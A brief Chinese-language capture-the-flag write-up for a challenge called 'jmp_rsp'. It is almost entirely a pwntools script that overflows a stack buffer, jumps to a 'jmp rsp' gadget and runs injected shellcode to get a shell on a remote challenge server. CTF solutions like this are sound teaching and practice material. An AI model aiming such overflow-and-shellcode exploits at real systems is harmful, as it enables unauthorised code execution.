## `jmp_rsp`

栈可执行，往栈上注入`shellcode`后跳转到栈上执行即可。

```python
from pwn import \*
#p=process('./jmp\_rsp')
#gdb.attach(p,'b main')
#gdb.debug('./jmp\_rsp')
p=remote('47.106.122.102',49602)
context.log\_level='debug'
context.arch='amd64'
context.os='linux'
#gdb.attach(p)
jmp\_rsp=0x000000000046d01d
shellcode=asm(shellcraft.sh())
#0x7fffffffdde0
#0x7ffeb21fe9e8
# RBP 0x7fffffffde60
payload=b'a'\*0x88+p64(jmp\_rsp)
payload+=shellcode
# jmp 0x7fffffffde70
p.sendline(payload)
p.interactive()
```
